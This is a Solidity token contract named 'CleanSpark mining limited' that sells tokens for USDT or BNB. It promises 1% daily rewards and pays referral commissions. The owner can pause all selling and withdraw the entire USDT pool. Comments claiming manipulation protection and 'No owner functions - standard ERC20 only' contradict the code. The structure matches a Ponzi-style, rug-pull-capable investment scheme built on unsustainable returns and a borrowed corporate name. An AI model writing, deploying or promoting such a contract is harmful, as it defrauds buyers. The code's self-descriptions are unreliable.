// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title CleanSpark mining limited - ERC20 Token with Reward System
 * @notice Fixed price token with 1% daily auto-rewards. Buy/sell at fixed price to prevent manipulation.
 * @dev Security: Reentrancy protection, fixed price mechanism to prevent pump and dump
 */

// IERC20 interface for USDT
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract CleanSpark {
    // Token Info
    string public name = "CleanSpark mining limited";
    string public symbol = "CleanSpark";
    uint8 public decimals = 18;
    uint256 public totalSupply = 10_000_000 * 10**18; // 10 Million
    
    // USDT Token Address on BSC (BEP20)
    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    
    // Mappings
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    // Owner (for reward distribution and liquidity management)
    address public owner;
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    // Circuit Breaker: Pause mechanism for emergencies
    bool public paused = false;
    modifier whenNotPaused() {
        require(!paused, "Contract is paused");
        _;
    }
    
    event Paused(address account);
    event Unpaused(address account);
    
    // Rewards
    uint256 public constant REWARD_RATE = 10; // 1% per interval (denominator = 1000)
    uint256 public constant DAILY_REWARD = 1 days; // reward every 1 day
    
    struct HoldRecord {
        uint256 lockedAmount; // used as principal for reward calculation
        uint256 lastClaim;
        uint256 purchaseTime;
    }
    
    mapping(address => HoldRecord) public holdings;
    
    // Reward tracking - balances include automatic rewards
    
    // Fixed Price Mechanism (to prevent manipulation)
    uint256 public constant FIXED_PRICE = 1e18; // 1 USDT per token (1 USDT = 1 token)
    uint256 public poolUSDT; // USDT reserve for fixed price trading
    
    // BNB to USDT conversion rate (1 BNB = bnbToUsdtRate USDT, with 18 decimals)
    // Example: 600 USDT per BNB = 600 * 1e18
    uint256 public bnbToUsdtRate = 600 * 1e18; // Default: 1 BNB = 600 USDT
    
    // Referral System
    uint256 public constant REFERRAL_COMMISSION = 50; // 5% commission (50/1000 = 5%)
    mapping(address => address) public referrerOf; // user => referrer
    mapping(address => uint256) public referralEarnings; // referrer => total earnings
    mapping(address => uint256) public referralCount; // referrer => number of referrals
    mapping(address => uint256) public totalReferredVolume; // referrer => total volume from referrals
    
    // Safety: Reentrancy guard
    bool private locked;
    modifier nonReentrant() {
        require(!locked, "ReentrancyGuard: reentrant call");
        locked = true;
        _;
        locked = false;
    }
    
    // Events
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event RewardsClaimed(address indexed claimer, uint256 rewardAmount);
    event TokensPurchased(address indexed buyer, uint256 usdtAmount, uint256 tokensReceived);
    event TokensSold(address indexed seller, uint256 tokensAmount, uint256 usdtReceived);
    event LiquidityAdded(address indexed owner, uint256 usdtAmount);
    event ReferralRegistered(address indexed user, address indexed referrer);
    event ReferralCommission(address indexed referrer, address indexed buyer, uint256 commission);
    
    constructor() {
        owner = msg.sender;
        balanceOf[owner] = totalSupply;
        poolUSDT = 0; // Initialize with 0, owner adds liquidity later
        emit Transfer(address(0), owner, totalSupply);
    }
    
    // Internal function to auto-register balance
    function _autoRegister(address user) internal {
        // Don't register contracts (they are typically DEX pools/routers)
        if (user.code.length > 0) return;
        
        // Register if: first time getting tokens OR user sold all tokens and buying again
        if (balanceOf[user] > 0 && (holdings[user].purchaseTime == 0 || holdings[user].lockedAmount == 0)) {
            // Register or re-register tokens
            holdings[user] = HoldRecord({
                lockedAmount: balanceOf[user],
                lastClaim: block.timestamp,
                purchaseTime: block.timestamp
            });
        }
    }
    
    // Internal function to automatically distribute pending rewards
    function _distributeRewards(address user) internal {
        HoldRecord storage record = holdings[user];
        if (record.lockedAmount == 0) return;
        
        uint256 timeSinceClaim = block.timestamp - record.lastClaim;
        if (timeSinceClaim < DAILY_REWARD) return; // less than reward interval
        
        // Use current balance as principal (in case user sold tokens)
        uint256 principal = balanceOf[user] < record.lockedAmount ? balanceOf[user] : record.lockedAmount;
        if (principal == 0) return;
        
        uint256 intervalsElapsed = timeSinceClaim / DAILY_REWARD;
        uint256 intervalReward = (principal * REWARD_RATE) / 1000;
        uint256 totalRewards = intervalReward * intervalsElapsed;
        
        if (totalRewards > 0) {
            // Transfer rewards from owner's reserve
            require(balanceOf[owner] >= totalRewards, "Insufficient owner balance for rewards");
            
            // Update lastClaim BEFORE state changes (CEI: Checks, Effects, Interactions)
            record.lastClaim = block.timestamp;
            
            // Update balances
            balanceOf[owner] -= totalRewards;
            balanceOf[user] += totalRewards;
            
            emit Transfer(owner, user, totalRewards);
            emit RewardsClaimed(user, totalRewards);
        }
    }
    
    // Internal function to update principal after balance changes
    function _updatePrincipal(address user) internal {
        HoldRecord storage record = holdings[user];
        if (record.lockedAmount == 0) return; // Not registered
        
        // Update principal to current balance (after transfer)
        // This ensures rewards are calculated on remaining balance only
        record.lockedAmount = balanceOf[user];
    }
    
    // Lock removed: no restrictions on transfers
    
    // Standard ERC20 Functions
    function transfer(address to, uint256 amount) public whenNotPaused returns (bool) {
        // Auto-distribute rewards before transfer
        _distributeRewards(msg.sender);
        
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        require(to != address(0), "Invalid address");
        require(amount > 0, "Amount must be greater than zero");
        
        // No lock restrictions
        
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        
        // Update principal to remaining balance (rewards calculated on remaining only)
        _updatePrincipal(msg.sender);
        
        // Auto-register balances for rewards
        _autoRegister(msg.sender);
        _autoRegister(to);
        
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) public whenNotPaused returns (bool) {
        require(spender != address(0), "Invalid spender address");
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) public whenNotPaused returns (bool) {
        // Auto-distribute rewards before transfer
        _distributeRewards(from);
        
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        require(to != address(0), "Invalid address");
        require(amount > 0, "Amount must be greater than zero");
        
        // No lock restrictions
        
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        
        // Update principal to remaining balance (rewards calculated on remaining only)
        _updatePrincipal(from);
        
        // Auto-register balances for rewards
        _autoRegister(from);
        _autoRegister(to);
        
        emit Transfer(from, to, amount);
        return true;
    }
    
    // Fixed Price Trading Functions (to prevent manipulation)
    
    // Register referral (call before first purchase)
    function registerReferral(address referrer) public whenNotPaused {
        require(referrer != address(0), "Invalid referrer");
        require(referrer != msg.sender, "Cannot refer yourself");
        require(referrerOf[msg.sender] == address(0), "Already referred");
        require(balanceOf[msg.sender] == 0, "Already have tokens");
        require(referrer.code.length == 0 || referrer == owner, "Referrer cannot be a contract");
        
        referrerOf[msg.sender] = referrer;
        referralCount[referrer]++;
        emit ReferralRegistered(msg.sender, referrer);
    }
    
    // Buy tokens at fixed price with USDT (with referral support)
    function buyTokens(uint256 usdtAmount) public nonReentrant whenNotPaused {
        require(usdtAmount > 0, "Invalid amount");
        require(usdtAmount <= type(uint256).max / 1e18, "Amount too large");
        require(msg.sender != address(0), "Invalid sender");
        
        // Transfer USDT from user to contract
        IERC20 usdtToken = IERC20(USDT);
        require(usdtToken.balanceOf(msg.sender) >= usdtAmount, "Insufficient USDT balance");
        require(usdtToken.allowance(msg.sender, address(this)) >= usdtAmount, "Insufficient USDT allowance");
        
        // BSC USDT doesn't return boolean, so check balance increase instead
        uint256 balanceBefore = usdtToken.balanceOf(address(this));
        usdtToken.transferFrom(msg.sender, address(this), usdtAmount);
        uint256 balanceAfter = usdtToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore + usdtAmount, "USDT transfer failed");
        
        // Calculate tokens at fixed price
        // FIXED_PRICE = 1 USDT per token
        // tokens = usdtAmount (1 USDT = 1 token)
        uint256 tokensToGive = usdtAmount; // 1 USDT = 1 token
        
        // Check owner has enough tokens
        require(balanceOf[owner] >= tokensToGive, "Insufficient tokens in reserve");
        
        // Handle referral commission
        address referrer = referrerOf[msg.sender];
        uint256 commission = 0;
        
        if (referrer != address(0)) {
            // Calculate commission (5% of purchase)
            commission = (usdtAmount * REFERRAL_COMMISSION) / 1000;
            
            // Pay commission to referrer (in tokens at fixed price)
            // 1 USDT = 1 token, so commission in USDT = commission in tokens
            uint256 commissionTokens = commission; // 1 USDT = 1 token
            
            // Check owner has enough for commission
            if (balanceOf[owner] >= commissionTokens && commissionTokens > 0) {
                // Transfer commission tokens to referrer
                balanceOf[owner] -= commissionTokens;
                balanceOf[referrer] += commissionTokens;
                
                // Update referral stats
                referralEarnings[referrer] += commission;
                totalReferredVolume[referrer] += usdtAmount;
                
                // Auto-register referrer for rewards
                _autoRegister(referrer);
                
                emit Transfer(owner, referrer, commissionTokens);
                emit ReferralCommission(referrer, msg.sender, commission);
            }
        }
        
        // Transfer tokens to buyer (after commission)
        balanceOf[owner] -= tokensToGive;
        balanceOf[msg.sender] += tokensToGive;
        
        // Add USDT to pool (full amount, commission paid in tokens)
        poolUSDT += usdtAmount;
        
        // Auto-register for rewards
        _autoRegister(msg.sender);
        
        emit Transfer(owner, msg.sender, tokensToGive);
        emit TokensPurchased(msg.sender, usdtAmount, tokensToGive);
    }
    
    // Buy tokens with referral (one function)
    function buyTokensWithReferral(uint256 usdtAmount, address referrer) public whenNotPaused {
        require(usdtAmount > 0, "Invalid amount");
        require(usdtAmount <= type(uint256).max / 1e18, "Amount too large");
        require(referrer != address(0), "Invalid referrer");
        require(referrer != msg.sender, "Cannot refer yourself");
        require(referrer.code.length == 0 || referrer == owner, "Referrer cannot be a contract");
        
        // Register referral if not already registered
        if (referrerOf[msg.sender] == address(0) && referrer != address(0)) {
            registerReferral(referrer);
        }
        
        // Buy tokens (referral handled automatically)
        buyTokens(usdtAmount);
    }
    
    // Buy tokens with BNB (payable function)
    function buyTokensWithBNB() public payable nonReentrant whenNotPaused {
        require(msg.value > 0, "Invalid BNB amount");
        require(msg.sender != address(0), "Invalid sender");
        
        // Convert BNB to USDT equivalent
        // usdtAmount = (msg.value * bnbToUsdtRate) / 1e18
        uint256 usdtAmount = (msg.value * bnbToUsdtRate) / 1e18;
        require(usdtAmount > 0, "Amount too small");
        
        // Calculate tokens at fixed price (1 USDT = 1 token)
        uint256 tokensToGive = usdtAmount;
        
        // Check owner has enough tokens
        require(balanceOf[owner] >= tokensToGive, "Insufficient tokens in reserve");
        
        // Handle referral commission
        address referrer = referrerOf[msg.sender];
        uint256 commission = 0;
        
        if (referrer != address(0)) {
            // Calculate commission (5% of purchase)
            commission = (usdtAmount * REFERRAL_COMMISSION) / 1000;
            uint256 commissionTokens = commission;
            
            // Check owner has enough for commission
            if (balanceOf[owner] >= commissionTokens && commissionTokens > 0) {
                // Transfer commission tokens to referrer
                balanceOf[owner] -= commissionTokens;
                balanceOf[referrer] += commissionTokens;
                
                // Update referral stats
                referralEarnings[referrer] += commission;
                totalReferredVolume[referrer] += usdtAmount;
                
                // Auto-register referrer for rewards
                _autoRegister(referrer);
                
                emit Transfer(owner, referrer, commissionTokens);
                emit ReferralCommission(referrer, msg.sender, commission);
            }
        }
        
        // Transfer tokens to buyer (after commission)
        balanceOf[owner] -= tokensToGive;
        balanceOf[msg.sender] += tokensToGive;
        
        // Add USDT equivalent to pool (BNB stored as BNB, but tracked as USDT value)
        poolUSDT += usdtAmount;
        
        // Auto-register for rewards
        _autoRegister(msg.sender);
        
        emit Transfer(owner, msg.sender, tokensToGive);
        emit TokensPurchased(msg.sender, usdtAmount, tokensToGive);
    }
    
    // Buy tokens with BNB and referral
    function buyTokensWithBNBAndReferral(address referrer) public payable whenNotPaused {
        require(msg.value > 0, "Invalid BNB amount");
        require(referrer != address(0), "Invalid referrer");
        require(referrer != msg.sender, "Cannot refer yourself");
        require(referrer.code.length == 0 || referrer == owner, "Referrer cannot be a contract");
        
        // Register referral if not already registered
        if (referrerOf[msg.sender] == address(0) && referrer != address(0)) {
            registerReferral(referrer);
        }
        
        // Buy tokens with BNB (referral handled automatically)
        buyTokensWithBNB();
    }
    
    // Owner function to update BNB to USDT conversion rate
    function setBnbToUsdtRate(uint256 newRate) public onlyOwner {
        require(newRate > 0, "Invalid rate");
        require(newRate <= 10000 * 1e18, "Rate too high"); // Max 10000 USDT per BNB
        bnbToUsdtRate = newRate;
    }
    
    // Sell tokens at fixed price
    function sellTokens(uint256 tokenAmount) public nonReentrant whenNotPaused {
        // Auto-distribute rewards first
        _distributeRewards(msg.sender);
        
        require(tokenAmount > 0, "Invalid amount");
        require(tokenAmount <= type(uint256).max / 1e18, "Amount too large");
        require(balanceOf[msg.sender] >= tokenAmount, "Insufficient balance");
        require(msg.sender != address(0), "Invalid sender");
        
        // Calculate USDT at fixed price
        // FIXED_PRICE = 1 USDT per token
        // usdt = tokenAmount (1 token = 1 USDT)
        uint256 usdtToGive = tokenAmount; // 1 token = 1 USDT
        
        // Check pool has enough USDT
        require(poolUSDT >= usdtToGive, "Insufficient USDT in pool");
        
        // Transfer tokens from seller
        balanceOf[msg.sender] -= tokenAmount;
        balanceOf[owner] += tokenAmount;
        
        // Remove USDT from pool
        poolUSDT -= usdtToGive;
        
        // Update principal to remaining balance
        _updatePrincipal(msg.sender);
        
        // Try to send USDT first, if fails send BNB
        IERC20 usdtToken = IERC20(USDT);
        uint256 usdtBalance = usdtToken.balanceOf(address(this));
        
        if (usdtBalance >= usdtToGive) {
            // Send USDT
            // BSC USDT doesn't return boolean, so check balance decrease instead
            uint256 balanceBefore = usdtToken.balanceOf(address(this));
            usdtToken.transfer(msg.sender, usdtToGive);
            uint256 balanceAfter = usdtToken.balanceOf(address(this));
            require(balanceAfter <= balanceBefore - usdtToGive, "USDT transfer failed");
        } else {
            // Convert USDT amount to BNB and send BNB
            // bnbAmount = (usdtToGive * 1e18) / bnbToUsdtRate
            uint256 bnbAmount = (usdtToGive * 1e18) / bnbToUsdtRate;
            require(address(this).balance >= bnbAmount, "Insufficient BNB in contract");
            (bool success, ) = payable(msg.sender).call{value: bnbAmount}("");
            require(success, "BNB transfer failed");
        }
        
        emit Transfer(msg.sender, owner, tokenAmount);
        emit TokensSold(msg.sender, tokenAmount, usdtToGive);
    }
    
    // Owner function to add USDT that was directly sent to contract
    // Owner sends USDT directly to contract address, then calls this function
    function addLiquidityFromContract() public onlyOwner {
        address usdt = USDT;
        
        // Get contract's USDT balance
        (, bytes memory balanceData) = usdt.staticcall(
            abi.encodeWithSelector(bytes4(keccak256("balanceOf(address)")), address(this))
        );
        uint256 contractBalance = abi.decode(balanceData, (uint256));
        
        require(contractBalance > 0, "No USDT in contract");
        
        // Calculate how much to add (all available USDT)
        uint256 amountToAdd = contractBalance;
        
        // Update pool
        poolUSDT += amountToAdd;
        emit LiquidityAdded(owner, amountToAdd);
    }
    
    // Owner function to add specific amount of USDT from contract balance
    function addLiquidityAmount(uint256 usdtAmount) public onlyOwner {
        require(usdtAmount > 0, "Invalid amount");
        
        address usdt = USDT;
        
        // Get contract's USDT balance
        (, bytes memory balanceData) = usdt.staticcall(
            abi.encodeWithSelector(bytes4(keccak256("balanceOf(address)")), address(this))
        );
        uint256 contractBalance = abi.decode(balanceData, (uint256));
        
        require(contractBalance >= usdtAmount, "Insufficient USDT in contract");
        
        // Update pool
        poolUSDT += usdtAmount;
        emit LiquidityAdded(owner, usdtAmount);
    }
    
    // Owner function to withdraw USDT from contract
    function withdrawUSDT(uint256 amount) public onlyOwner {
        require(amount > 0, "Invalid amount");
        require(poolUSDT >= amount, "Insufficient pool");
        
        // Update pool
        poolUSDT -= amount;
        
        // Transfer USDT to owner using low-level call
        address usdt = USDT;
        (bool success, ) = usdt.call(
            abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), owner, amount)
        );
        require(success, "USDT transfer failed");
    }
    
    // Owner function to withdraw all USDT from contract (up to pool amount)
    function withdrawAllUSDT() public onlyOwner {
        uint256 amount = poolUSDT;
        require(amount > 0, "No USDT to withdraw");
        
        // Reset pool
        poolUSDT = 0;
        
        // Transfer all USDT to owner
        address usdt = USDT;
        (bool success, ) = usdt.call(
            abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), owner, amount)
        );
        require(success, "USDT transfer failed");
    }
    
    // Get pool balance
    function getPoolBalance() public view returns (uint256) {
        return poolUSDT;
    }
    
    // Get referral information
    function getReferralInfo(address user) public view returns (
        address referrer,
        uint256 totalEarnings,
        uint256 count,
        uint256 totalVolume
    ) {
        return (
            referrerOf[user],
            referralEarnings[user],
            referralCount[user],
            totalReferredVolume[user]
        );
    }
    
    // Check if user has referrer
    function hasReferrer(address user) public view returns (bool) {
        return referrerOf[user] != address(0);
    }
    
    // Calculate Pending Rewards (for display purposes)
    function calculateRewards(address user) public view returns (uint256) {
        HoldRecord memory record = holdings[user];
        if (record.lockedAmount == 0) return 0;
        
        uint256 timeSinceClaim = block.timestamp - record.lastClaim;
        if (timeSinceClaim < DAILY_REWARD) return 0;
        
        // Use current balance as principal (in case user sold tokens)
        uint256 principal = balanceOf[user] < record.lockedAmount ? balanceOf[user] : record.lockedAmount;
        if (principal == 0) return 0;
        
        uint256 intervalsElapsed = timeSinceClaim / DAILY_REWARD;
        uint256 intervalReward = (principal * REWARD_RATE) / 1000;
        uint256 totalRewards = intervalReward * intervalsElapsed;
        
        return totalRewards;
    }
    
    // Manual claim function (optional, rewards auto-distribute on any transfer)
    function claimRewards() public whenNotPaused {
        require(msg.sender != address(0), "Invalid sender");
        _distributeRewards(msg.sender);
        // Update principal to current balance after claiming
        _updatePrincipal(msg.sender);
    }
    
    // Circuit Breaker Functions (Owner only)
    function pause() public onlyOwner {
        require(!paused, "Already paused");
        paused = true;
        emit Paused(msg.sender);
    }
    
    function unpause() public onlyOwner {
        require(paused, "Not paused");
        paused = false;
        emit Unpaused(msg.sender);
    }
    
    // No owner functions - standard ERC20 only
    // All trading happens on PancakeSwap
    
    function getUserHoldings(address user) public view returns (
        uint256 lockedAmount,
        uint256 earnedRewards,
        uint256 totalBalance,
        uint256 pendingRewards,
        uint256 lockEnd,
        bool isLocked
    ) {
        HoldRecord memory record = holdings[user];
        
        // Calculate earned rewards from balance
        uint256 earned = 0;
        if (balanceOf[user] > record.lockedAmount) {
            earned = balanceOf[user] - record.lockedAmount;
        }
        
        return (
            record.lockedAmount,
            earned,
            balanceOf[user],
            calculateRewards(user),
            0,
            false
        );
    }
}

